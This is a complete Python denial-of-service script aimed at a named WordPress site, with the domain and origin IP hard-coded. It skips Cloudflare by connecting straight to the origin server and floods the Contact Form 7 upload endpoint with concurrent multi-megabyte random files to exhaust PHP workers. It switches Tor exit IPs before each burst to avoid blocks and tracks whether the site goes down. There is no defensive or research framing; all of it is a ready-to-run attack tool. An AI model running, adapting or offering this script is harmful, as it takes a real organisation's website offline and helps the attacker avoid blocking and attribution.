#!/usr/bin/env python3
"""
upload_burst.py — CF7 large file upload worker exhaustion.
Bypasses Cloudflare via direct origin IP.
Tor SOCKS5 with NEWNYM per burst.
"""

import requests, threading, time, urllib3, io, os, argparse
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

G="\033[0;32m"; R="\033[0;31m"; Y="\033[0;33m"; C="\033[0;36m"; W="\033[0m"; B="\033[1m"

ap = argparse.ArgumentParser()
ap.add_argument("--origin",      default="104.236.194.226")
ap.add_argument("--host",        default="metoo-buffalo.com")
ap.add_argument("--form-id",     default="248")
ap.add_argument("--unit-tag",    default="wpcf7-f248-p850-o1")
ap.add_argument("--concurrency", type=int, default=25)
ap.add_argument("--file-mb",     type=float, default=5, help="file size in MB")
ap.add_argument("--bursts",      type=int, default=0, help="0 = infinite")
ap.add_argument("--no-tor",      action="store_true")
args = ap.parse_args()

TARGET  = f"https://{args.origin}/wp-json/contact-form-7/v1/contact-forms/{args.form_id}/feedback"
BASE    = f"https://{args.host}"
PROXY   = "socks5h://127.0.0.1:9050"
PROXIES = {"http": PROXY, "https": PROXY}

HEADERS = {
    "Host":       args.host,
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Accept":     "*/*",
    "Referer":    BASE + "/",
}

FIELDS = {
    "_wpcf7":          args.form_id,
    "_wpcf7_version":  "5.9",
    "_wpcf7_unit_tag": args.unit_tag,
    "text-7":          "Hello there",
    "email-532":       "user@example.com",
}

# Generate file data once in memory
FILE_BYTES = os.urandom(int(args.file_mb * 1024 * 1024))
print(f"[*] File size: {len(FILE_BYTES)/1024/1024:.1f} MB")

# Tor NEWNYM
ctrl = None
ctrl_lock = threading.Lock()
USE_TOR = False

if not args.no_tor:
    import socket
    try:
        s = socket.create_connection(("127.0.0.1", 9050), timeout=2); s.close()
        USE_TOR = True
        print(f"[+] Tor SOCKS5 available on :9050")
    except:
        print(f"[!] Tor not running on :9050 — using direct connection")

    if USE_TOR:
        try:
            from stem import Signal
            from stem.control import Controller
            ctrl = Controller.from_port(port=9051)
            ctrl.authenticate()
            print(f"[+] Tor control connected (NEWNYM enabled)")
        except Exception as e:
            print(f"[!] Tor control unavailable: {e} — no NEWNYM")

def new_ip():
    if ctrl:
        with ctrl_lock:
            ctrl.signal(Signal.NEWNYM)
            time.sleep(0.6)

# homepage monitor
mon = {"ms": 0, "code": 0, "tag": "...", "color": W}
mon_lock = threading.Lock()

def monitor_loop():
    while True:
        t0m = time.time()
        try:
            r = requests.get(f"https://{args.origin}/", timeout=12, verify=False,
                             headers={"Host": args.host, "User-Agent": "Mozilla/5.0 Chrome/124"},
                             proxies=PROXIES if USE_TOR else {})
            ms, code = (time.time()-t0m)*1000, r.status_code
            color, tag = (R,"DOWN") if code==503 else (G,"FAST") if ms<800 else (Y,"SLOW") if ms<2000 else (R,"DEGRADED")
        except:
            ms, code, color, tag = (time.time()-t0m)*1000, 0, R, "TIMEOUT"
        with mon_lock:
            mon.update(ms=ms, code=code, tag=tag, color=color)
        time.sleep(5)

threading.Thread(target=monitor_loop, daemon=True).start()
time.sleep(1)

print(f"\n{B}{'='*68}{W}")
print(f"  upload_burst — CF7 File Upload Worker Exhaustion")
print(f"{'='*68}")
print(f"  Origin      : {args.origin} (CF bypassed)")
print(f"  Host        : {args.host}")
print(f"  File        : {args.file_mb} MB per request")
print(f"  Concurrency : {args.concurrency}")
print(f"  Proxy       : {'TorPool (NEWNYM/burst)' if USE_TOR else 'Direct (no Tor)'}")
print(f"{B}{'='*68}{W}\n")
print(f"  {'BURST':<6} {'TIME':<9} {'200':>4} {'500':>4} {'403':>4} {'ERR':>4} {'AVG':>7}  STATUS")
print(f"  {'─'*66}")

def fire(_):
    t0 = time.time()
    try:
        files = {"file-upload": ("data.txt", io.BytesIO(FILE_BYTES), "text/plain")}
        r = requests.post(TARGET, headers=HEADERS, data=FIELDS, files=files,
                         proxies=PROXIES if USE_TOR else {},
                         timeout=180, verify=False)
        return r.status_code, time.time() - t0
    except Exception:
        return 0, time.time() - t0

burst=0; total=0; t_start=time.time()
try:
    while True:
        if args.bursts and burst >= args.bursts: break
        burst += 1
        ts = datetime.now().strftime("%H:%M:%S")

        new_ip()  # rotate IP before each burst

        with ThreadPoolExecutor(max_workers=args.concurrency) as ex:
            futs = [ex.submit(fire, i) for i in range(args.concurrency)]
            codes, times = [], []
            for f in as_completed(futs):
                c, t = f.result(); codes.append(c); times.append(t); total += 1

        c200=codes.count(200); c500=codes.count(500)
        c403=codes.count(403); cerr=codes.count(0)
        avg = sum(times)/len(times)

        if c500 > 0:   st = f"{R}{B}SERVER CRASH{W}"
        elif c200 > 0 and avg > 30: st = f"{R}HEAVY DEGRADED{W}"
        elif c200 > 0 and avg > 10: st = f"{Y}DEGRADED{W}"
        elif c200 > 0: st = f"{G}HITTING PHP-FPM{W}"
        elif c403 > 0: st = f"{Y}BLOCKED{W}"
        else:          st = f"{R}ERR{W}"

        with mon_lock:
            mon_str = f"{mon['color']}{mon['ms']:.0f}ms {mon['tag']} HTTP {mon['code']}{W}"

        print(f"  {C}[{burst:>4}]{W} {ts}  {c200:>4} {c500:>4} {c403:>4} {cerr:>4} {avg:>6.1f}s  {st}  │ {mon_str}")

except KeyboardInterrupt:
    pass

elapsed = time.time() - t_start
print(f"\n{B}{'='*68}{W}")
print(f"  Bursts:{burst}  Reqs:{total}  Runtime:{elapsed:.0f}s")
print(f"{B}{'='*68}{W}\n")
